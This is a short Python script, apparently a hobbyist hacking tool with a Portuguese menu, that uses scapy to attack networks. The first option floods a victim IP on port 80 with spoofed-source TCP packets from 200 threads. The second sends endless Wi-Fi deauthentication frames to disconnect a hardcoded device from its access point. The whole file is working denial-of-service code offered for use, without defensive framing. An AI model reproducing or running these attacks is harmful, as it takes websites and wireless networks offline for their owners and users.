from time import sleep
import os
from scapy.all import *
import threading 
def dos(vitima):
	def ataque():
		pacote=IP(src=RandIP("*.*.*.*"), dst=vitima) / TCP(dport=80)
		send(pacote, loop=1, inter=0)
	for x in range(200):
		threading.Thread(target=ataque).start()	

def dos2():
	BSSID="E4:18:6B:36:D6:A8"
	Mac= "30:0B:07:C4:3A:59"
	frame=RadioTap()/ Dot11(addr1=Mac, addr2=BSSID, addr3=BSSID)/ Dot11Deauth()
	sendp(frame, iface='wlan0', loop=1, inter=0)

def ini():
	try:
		os.system("cls")
		os.system("clear")
	except:
		pass
	print("\n")
	print("Criador: ProgramadorBr51")
	print("\n\n")

	print("1- Derrubar sites\n2- Derrubar rede")
	escolha= int(input(">> "))
	if escolha == 1:
		vitima=raw_input("IP DA VITIMA ? ")
		dos(vitima)
	elif escolha ==2:
		dos2()
		
ini()
